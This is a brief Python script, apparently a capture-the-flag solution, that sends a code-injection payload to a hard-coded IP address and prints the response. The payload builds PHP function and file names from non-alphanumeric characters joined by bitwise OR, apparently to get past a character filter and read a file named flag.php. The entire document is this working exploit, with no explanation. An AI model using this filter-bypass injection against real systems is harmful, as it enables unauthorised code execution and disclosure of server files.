#!/usr/bin/env python

import requests

url = 'http://69.90.132.196:5003/'
payl = {
    'warmup': r"""
("2%!$&),%"|"@@@@@@@@")("&,!@$0(0"|"@@@'*@@@");
""".strip()
}
r = requests.get(url, params=payl)
print(r.text.split('"')[1])